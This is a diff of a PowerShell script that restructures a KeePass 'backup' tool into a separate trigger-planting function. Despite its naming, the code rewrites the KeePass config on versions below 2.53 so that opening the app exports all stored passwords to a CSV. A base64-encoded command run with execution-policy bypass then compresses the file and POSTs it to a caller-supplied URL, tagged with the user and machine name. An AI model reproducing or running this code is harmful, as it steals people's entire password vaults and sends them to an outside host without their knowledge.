@@ -1,69 +1,62 @@
 
-function Invoke-KeePassBackup {
-    # Parameters
+function Invoke-KeePassTrigger{
     param (
-    [Parameter(Position = 0, Mandatory = $true)]
-    [string]$url
+        [string]$url
     )
 
-    Write-Host "--------------- KeePass backup for $($env:USERNAME)@$($env:COMPUTERNAME)" -ForegroundColor Green
-
-    # Pre-defined location
-    $defaultPath = "C:\Program Files\KeePass Password Safe 2\KeePass.exe"
-
-    # Check if KeePass exists at the pre-defined location
-    if (Test-Path $defaultPath) {
-        $keepassPath = $defaultPath
-    } else {
-        # If not found, then search for it
-        $keepassPath = (Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter KeePass.exe).FullName | Select-Object -First 1
-    }
-
-    Write-Host "KeePass location: $keepassPath"
-
-    # Fetch KeePass version
-    $keepassVersion = (Get-Command $keepassPath).FileVersionInfo.ProductVersion
-    Write-Host "KeePass version: $keepassVersion" -ForegroundColor Blue
-
+    $appData = [Environment]::GetEnvironmentVariable("APPDATA")
+    $configFile = "$appData\KeePass\KeePass.config.xml"
     $tempLocation = [Environment]::GetEnvironmentVariable("TEMP", "User")
 
-    # If KeePass version is less than 2.53 and -c switch is used
-    if ([version]$keepassVersion -lt [version]"2.53") {
 
-        $appData = [Environment]::GetEnvironmentVariable("APPDATA")
-        $configFile = "$appData\KeePass\KeePass.config.xml"
-        Write-Host "--------------- Adding an export trigger on config file: $configFile" -ForegroundColor Green
+    # Check if the config file exists at the pre-defined location
+    if (-not (Test-Path $configFile)) {
+        Write-Host "KeePass config file not found at the default location. Searching for it..." -ForegroundColor Yellow
 
-        # Backup current config file
-        $backupFileName = "KeePass.config.backup.xml"
-        $backupPath = Join-Path -Path $appData -ChildPath "KeePass\$backupFileName"
-        Copy-Item -Path $configFile -Destination $backupPath
-        Write-Host "Backup of current config file done at: $backupPath"
+        # Search for the KeePass config file
+        $searchedConfigFile = (Get-ChildItem -Path C:\Users\ -Recurse -ErrorAction SilentlyContinue -Filter KeePass.config.xml).FullName | Select-Object -First 1
 
-        # Set export location
-        $filename = Join-Path -Path $tempLocation -ChildPath "KeePassBackup.csv"
-        Write-Host "Export location: $filename"
+        if ($searchedConfigFile) {
+            $configFile = $searchedConfigFile
+            Write-Host "Found KeePass config file at: $configFile" -ForegroundColor Green
+        } else {
+            Write-Host "KeePass config file not found on the system." -ForegroundColor Red
+            return
+        }
+    }
 
-        # Load the XML file into the $xml object
-        $configXML = [xml](Get-Content $configFile)
+    Write-Host "--------------- Adding an export trigger on config file: $configFile" -ForegroundColor Green
 
-        # Remove triggers
-        $configXML.SelectNodes("//Triggers").RemoveAll()
-        $configXML.Save($configFile)
+    # Backup current config file
+    $backupFileName = "KeePass.config.backup.xml"
+    $backupPath = Join-Path -Path $appData -ChildPath "KeePass\$backupFileName"
+    Copy-Item -Path $configFile -Destination $backupPath
+    Write-Host "Backup of current config file done at: $backupPath"
 
-        $exportCommands = '<Parameter>' + $filename + '</Parameter>'
+    # Set export location
+    $filename = Join-Path -Path $tempLocation -ChildPath "KeePassBackup.csv"
+    Write-Host "Export location: $filename"
 
-        $fileNameValue = [System.IO.Path]::GetFileName($filename)
-        $fullFileNameVar = "$env:USERNAME@$env:COMPUTERNAME-$fileNameValue"
-        $uploadScript = "`$compressedStream = New-Object System.IO.MemoryStream; `$gzipStream = New-Object System.IO.Compression.GZipStream(`$compressedStream, [System.IO.Compression.CompressionMode]::Compress); `$bytesToWrite = [System.IO.File]::ReadAllBytes('$filename'); `$gzipStream.Write(`$bytesToWrite, 0, `$bytesToWrite.Length); `$gzipStream.Close(); `$encodedFile = [System.Convert]::ToBase64String(`$compressedStream.ToArray()); Invoke-RestMethod -Uri '$url' -Method Post -Headers @{ 'X-File-Name' = '$fullFileNameVar' } -Body `$encodedFile"
+    # Load the XML file into the $xml object
+    $configXML = [xml](Get-Content $configFile)
 
-        $bytes = [Text.Encoding]::Unicode.GetBytes($uploadScript)
-        $encodedCommands = [Convert]::ToBase64String($bytes)
+    # Remove triggers
+    $configXML.SelectNodes("//Triggers").RemoveAll()
+    $configXML.Save($configFile)
 
-        $uploadCommands = '<Parameter>-ep bypass -nop -e ' + $encodedCommands + '</Parameter>'
+    $exportCommands = '<Parameter>' + $filename + '</Parameter>'
 
-        # Trigger - upload
-        $uploadAction = @"
+    $fileNameValue = [System.IO.Path]::GetFileName($filename)
+    $fullFileNameVar = "$env:USERNAME@$env:COMPUTERNAME-$fileNameValue"
+    $uploadScript = "`$compressedStream = New-Object System.IO.MemoryStream; `$gzipStream = New-Object System.IO.Compression.GZipStream(`$compressedStream, [System.IO.Compression.CompressionMode]::Compress); `$bytesToWrite = [System.IO.File]::ReadAllBytes('$filename'); `$gzipStream.Write(`$bytesToWrite, 0, `$bytesToWrite.Length); `$gzipStream.Close(); `$encodedFile = [System.Convert]::ToBase64String(`$compressedStream.ToArray()); Invoke-RestMethod -Uri '$url' -Method Post -Headers @{ 'X-File-Name' = '$fullFileNameVar' } -Body `$encodedFile"
+
+    $bytes = [Text.Encoding]::Unicode.GetBytes($uploadScript)
+    $encodedCommands = [Convert]::ToBase64String($bytes)
+
+    $uploadCommands = '<Parameter>-ep bypass -nop -e ' + $encodedCommands + '</Parameter>'
+
+    # Trigger - upload
+    $uploadAction = @"
 <Action>
     <TypeGuid>2uX4OwcwTBOe7y66y27kxw==</TypeGuid>
     <Parameters>
@@ -76,8 +69,8 @@ function Invoke-KeePassBackup {
 </Action>
 "@
 
-        # Trigger - export
-        $TriggerXML = [xml] @"
+    # Trigger - export
+    $TriggerXML = [xml] @"
 <Trigger>
     <Guid>$([Convert]::ToBase64String([guid]::NewGuid().ToByteArray()))</Guid>
     <Name>Offline notepad style backup of passwords</Name>
@@ -106,37 +99,64 @@ function Invoke-KeePassBackup {
 </Trigger>
 "@
 
-        ForEach ($Object in $configFile) {
-            # Determine the path from the object
-            $KeePassXMLPath = switch ($true) {
-                ($Object -is [String])                        { $Object }
-                ($Object.PSObject.Properties['KeePassConfigPath']) { $Object.KeePassConfigPath }
-                ($Object.PSObject.Properties['Path'])         { $Object.Path }
-                ($Object.PSObject.Properties['FullName'])     { $Object.FullName }
-                default                                       { [String]$Object }
-            }
-
-            if ($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath)) {
-                $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
-
-                $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
-
-                $null = [GUID]::NewGuid().ToByteArray()
-
-                if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
-                    $Triggers = $KeePassXML.CreateElement('Triggers')
-                    $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
-                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
-                } else {
-                    $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
-                }
-
-                $KeePassXML.Save($KeePassXMLPath)
-
-                Write-Host "Configuration complete. The trigger will go off as soon as it is opened."
-            }
+    ForEach ($Object in $configFile) {
+        # Determine the path from the object
+        $KeePassXMLPath = switch ($true) {
+            ($Object -is [String])                        { $Object }
+            ($Object.PSObject.Properties['KeePassConfigPath']) { $Object.KeePassConfigPath }
+            ($Object.PSObject.Properties['Path'])         { $Object.Path }
+            ($Object.PSObject.Properties['FullName'])     { $Object.FullName }
+            default                                       { [String]$Object }
         }
 
+        if ($KeePassXMLPath -and ($KeePassXMLPath -match '.\.xml$') -and (Test-Path -Path $KeePassXMLPath)) {
+            $KeePassXMLPath = Resolve-Path -Path $KeePassXMLPath
+
+            $KeePassXML = [xml](Get-Content -Path $KeePassXMLPath)
+
+            $null = [GUID]::NewGuid().ToByteArray()
+
+            if ($KeePassXML.Configuration.Application.TriggerSystem.Triggers -is [String]) {
+                $Triggers = $KeePassXML.CreateElement('Triggers')
+                $Null = $Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
+                $Null = $KeePassXML.Configuration.Application.TriggerSystem.ReplaceChild($Triggers, $KeePassXML.Configuration.Application.TriggerSystem.SelectSingleNode('Triggers'))
+            } else {
+                $Null = $KeePassXML.Configuration.Application.TriggerSystem.Triggers.AppendChild($KeePassXML.ImportNode($TriggerXML.Trigger, $True))
+            }
+
+            $KeePassXML.Save($KeePassXMLPath)
+
+            Write-Host "Configuration complete. The trigger will go off as soon as it is opened."
+        }
+    }
+}
+
+
+function Invoke-KeePassBackup {
+    # Parameters
+    param (
+    [Parameter(Position = 0, Mandatory = $true)]
+    [string]$url
+    )
+
+    Write-Host "--------------- KeePass backup for $($env:USERNAME)@$($env:COMPUTERNAME)" -ForegroundColor Green
+
+    # Determine KeePass location
+    $defaultPath = "C:\Program Files\KeePass Password Safe 2\KeePass.exe"
+    $keepassPath = if (Test-Path $defaultPath) { $defaultPath } else {
+        (Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue -Filter KeePass.exe).FullName | Select-Object -First 1
+    }
+    Write-Host "KeePass location: $keepassPath"
+
+    # Fetch KeePass version
+    $keepassVersion = (Get-Command $keepassPath).FileVersionInfo.ProductVersion
+    Write-Host "KeePass version: $keepassVersion" -ForegroundColor Blue
+
+
+
+    # If KeePass version is less than 2.53 and -c switch is used
+    if ([version]$keepassVersion -lt [version]"2.53") {
+        Invoke-KeePassTrigger -url $url
     }
     Write-Host "--------------- Scanning for KeePass databases on $($env:COMPUTERNAME)" -ForegroundColor Green
 
